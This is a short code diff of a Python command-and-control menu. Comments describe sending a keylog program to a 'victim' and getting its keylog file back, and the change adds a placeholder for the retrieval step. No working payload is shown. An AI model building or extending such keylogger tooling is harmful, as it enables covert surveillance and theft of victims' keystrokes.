@@ -46,10 +46,13 @@ if __name__ == '__main__':
                 if command == constants.PERFORM_MENU_ITEM_TWO:
                     perform_menu_item_2(connected_clients)
 
-
                 # MENU ITEM 3 - Transfer keylog program to victim
                 if command == constants.PERFORM_MENU_ITEM_THREE:
                     perform_menu_item_3(connected_clients)
+
+                # MENU ITEM 4 - Get Keylog File from Victim
+                if command == constants.PERFORM_MENU_ITEM_FOUR:
+                    print("HELLO")
 
                 # MENU ITEM 5 - Disconnect from victim
                 if command == constants.PERFORM_MENU_ITEM_FIVE:
